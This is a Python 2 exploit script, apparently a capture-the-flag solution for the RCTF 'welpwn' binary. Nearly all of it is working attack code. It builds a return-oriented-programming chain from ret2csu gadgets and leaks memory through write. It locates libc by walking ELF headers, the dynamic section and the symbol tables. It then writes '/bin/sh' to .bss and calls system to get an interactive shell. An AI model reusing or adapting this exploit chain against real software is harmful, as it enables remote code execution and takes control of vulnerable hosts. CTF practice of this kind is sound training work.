from zio import *
from pwnlib.dynelf import *
from pwnlib.elf import *
from myDynELF import *
import ctypes

target  = './welpwn_932a4428ea8d4581431502ab7e66ea4b'
io      = zio(target, print_read = False, print_write = False, timeout = 0x10000)

pop_rdi     = 0x004008a3
pop_rsi_p   = 0x004008a1
p4_ret      = 0x0040089c
plt_puts    = 0x004005a0
got_write   = 0x00601020
got_puts    = 0x00601018
adr_bss     = 0x00601000
got_read    = 0x00601038

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

def leak(address, size):
    payload  = 'A' * 24
    payload += l64(p4_ret)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = got_write,
            arg1 = 0x1, 
            arg2 = address, 
            arg3 = size) 
    payload += l64(0x400630) # program entry
    io.wl(payload)
    leak_data = io.rtl('A' * 24 + l64(p4_ret)[:3]).replace('Welcome to RCTF\n', '').replace('A' * 24 + l64(p4_ret)[:3], '')
    # print '[-] {}\t==>\t{}'.format(hex(ctypes.c_uint64(address).value), leak_data.encode('hex'))
    return leak_data

def getshell(adr_system):
    raw_input()
    payload  = 'A' * 24
    payload += l64(p4_ret)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = got_read,
            arg1 = 0x0, 
            arg2 = adr_bss + 0x80, 
            arg3 = 0x10)
    payload += com_gadget(0x40089a, 0x400880, jmp2 = adr_bss + 0x88,
            arg1 = adr_bss + 0x80)
    payload += l64(0xdeadbeef)
    io.wl(payload)
    io.wl('/bin/sh\x00' + l64(adr_system))

# manual leak libc
BITS = 64

# get arbitrary address located in libc
def get_elf_entry(got):
    entry = l64(leak(got, 0x8))
    print '[+] libc entry\t\t\t\t:\t0x%x' % entry
    return entry

# find libc base according to Magic
def find_elf_base(entry):
    if BITS == 64:
        libc_base = entry & 0xfffffffffffff000
        while True:
            garbage = leak(libc_base, 0x4)
            if garbage == '\x7fELF':
                break
            libc_base -= 0x1000
        print '[+] libc base\t\t\t\t:\t0x%x' % libc_base
        return libc_base

# find program header table 
def find_phdr(elf_base):
    if BITS == 64:
        # get address of program header table
        phdr = l64(leak(elf_base + 0x20, 0x8)) + elf_base
        print '[+] program headers table\t\t:\t0x%x' % phdr
        return phdr

# find dynamic section table (.dynamic section -> DYNAMIC segment)
def find_dyn_section(phdr, elf_base):
    if BITS == 64:
        phdr_ent = phdr
        while True:
            garbage = l32(leak(phdr_ent, 0x4))
            # p_type of dynamic segment is 0x2
            if garbage == 0x2:
                break
            phdr_ent += 0x38
        dyn_section = l64(leak(phdr_ent + 0x10, 0x8)) + elf_base
        print '[+] .dynamic section headers table\t:\t0x%x' % dyn_section
        return dyn_section

def find_sym_str_table(dyn_section):
    if BITS == 64:
        dyn_ent = dyn_section
        dt_sym_tab = 0x0
        dt_str_tab = 0x0
        while True:
            garbage = l64(leak(dyn_ent, 0x8))
            if garbage == 0x6:
                dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
            elif garbage == 0x5:
                dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
            if dt_str_tab and dt_sym_tab:
                break
            dyn_ent += 0x10
        print '[+] symtab\t\t\t\t:\t0x%x' % dt_sym_tab
        print '[+] strtab\t\t\t\t:\t0x%x' % dt_str_tab 
        return (dt_sym_tab, dt_str_tab)

def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
    if BITS == 64:
        sym_ent = dt_sym_tab
        while True:
            garbage = l32(leak(sym_ent, 0x4)) 
            name    = leak(dt_str_tab + garbage, len(func))
            if name == func:
                break
            sym_ent += 0x18
        adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
        print '[+] %s loaded address\t:\t0x%x' % (func, adr_func)
        return adr_func

# exploit ELF
def lookup(func):
    entry                   = get_elf_entry(got_write)
    elf_base                = find_elf_base(entry)
    phdr                    = find_phdr(elf_base)
    dyn_section             = find_dyn_section(phdr, elf_base)
    dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)
    func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
    return func_address

def exp():
    d = MyDynELF(64)
    adr_system = d.lookup(leak, got_write, '__libc_system')
    getshell(adr_system)
    io.itr()

if __name__ == '__main__':
    # try:
    exp()
    # except:
    # print '[!] exploit failed'
